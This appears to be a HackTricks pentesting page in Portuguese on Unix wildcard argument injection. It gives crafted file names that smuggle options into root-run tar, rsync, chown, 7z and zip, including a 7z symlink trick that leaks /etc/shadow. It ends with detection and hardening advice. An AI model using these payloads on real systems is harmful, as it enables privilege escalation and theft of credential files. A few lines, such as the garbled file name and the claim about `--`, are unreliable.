# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> A injeção de **argumento de wildcard** (também conhecida como *glob*) acontece quando um script privilegiado executa um binário Unix como `tar`, `chown`, `rsync`, `zip`, `7z`, … com um wildcard não entre aspas como `*`.
> Como o shell expande o wildcard **antes** de executar o binário, um atacante que pode criar arquivos no diretório de trabalho pode elaborar nomes de arquivos que começam com `-`, de modo que sejam interpretados como **opções em vez de dados**, efetivamente contrabandeando flags arbitrárias ou até mesmo comandos.
> Esta página coleta os primitivas mais úteis, pesquisas recentes e detecções modernas para 2023-2025.

## chown / chmod

Você pode **copiar o proprietário/grupo ou os bits de permissão de um arquivo arbitrário** abusando da flag `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Quando o root executa algo como:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` é injetado, fazendo com que *todos* os arquivos correspondentes herdem a propriedade/permissões de `/root/secret``file`.

*PoC & ferramenta*: [`wildpwn`](https://github.com/localh0t/wildpwn) (ataque combinado).
Veja também o clássico artigo da DefenseCode para mais detalhes.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Execute comandos arbitrários abusando do recurso **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Uma vez que o root executa, por exemplo, `tar -czf /root/backup.tgz *`, `shell.sh` é executado como root.

### bsdtar / macOS 14+

O `tar` padrão em versões recentes do macOS (baseado em `libarchive`) *não* implementa `--checkpoint`, mas você ainda pode alcançar a execução de código com a flag **--use-compress-program** que permite especificar um compressor externo.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Quando um script privilegiado executa `tar -cf backup.tar *`, `/bin/sh` será iniciado.

---

## rsync

`rsync` permite que você substitua o shell remoto ou até mesmo o binário remoto por meio de flags de linha de comando que começam com `-e` ou `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Se o root mais tarde arquivar o diretório com `rsync -az * backup:/srv/`, a flag injetada gera seu shell no lado remoto.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Mesmo quando o script privilegiado *defensivamente* prefixa o wildcard com `--` (para parar a análise de opções), o formato 7-Zip suporta **arquivos de lista de arquivos** prefixando o nome do arquivo com `@`. Combinar isso com um symlink permite que você *exfiltre arquivos arbitrários*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Se o root executar algo como:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip tentará ler `root.txt` (→ `/etc/shadow`) como uma lista de arquivos e sairá, **imprimindo o conteúdo no stderr**.

---

## zip

`zip` suporta a flag `--unzip-command` que é passada *verbatim* para o shell do sistema quando o arquivo será testado:
```bash
zip result.zip files -T --unzip-command "sh -c id"
```
Injecte a flag através de um nome de arquivo elaborado e aguarde o script de backup privilegiado chamar `zip -T` (testar arquivo) no arquivo resultante.

---

## Binaries adicionais vulneráveis à injeção de wildcard (lista rápida 2023-2025)

Os seguintes comandos foram abusados em CTFs modernos e em ambientes reais. O payload é sempre criado como um *nome de arquivo* dentro de um diretório gravável que será processado posteriormente com um wildcard:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Ler conteúdo do arquivo |
| `flock` | `-c <cmd>` | Executar comando |
| `git`   | `-c core.sshCommand=<cmd>` | Execução de comando via git sobre SSH |
| `scp`   | `-S <cmd>` | Iniciar programa arbitrário em vez de ssh |

Essas primitivas são menos comuns do que os clássicos *tar/rsync/zip*, mas vale a pena verificar ao caçar.

---

## Detecção & Dureza

1. **Desabilitar globbing de shell** em scripts críticos: `set -f` (`set -o noglob`) impede a expansão de wildcard.
2. **Citar ou escapar** argumentos: `tar -czf "$dst" -- *` não é seguro — prefira `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
3. **Caminhos explícitos**: Use `/var/www/html/*.log` em vez de `*` para que atacantes não possam criar arquivos irmãos que começam com `-`.
4. **Menor privilégio**: Execute trabalhos de backup/manutenção como uma conta de serviço não privilegiada em vez de root sempre que possível.
5. **Monitoramento**: A regra pré-construída da Elastic *Potential Shell via Wildcard Injection* procura por `tar --checkpoint=*`, `rsync -e*`, ou `zip --unzip-command` imediatamente seguido por um processo filho de shell. A consulta EQL pode ser adaptada para outros EDRs.

---

## Referências

* Elastic Security – Regra Detectada de Potencial Shell via Injeção de Wildcard (última atualização 2025)
* Rutger Flohil – “macOS — Injeção de wildcard do Tar” (18 de dezembro de 2024)

{{#include ../../banners/hacktricks-training.md}}
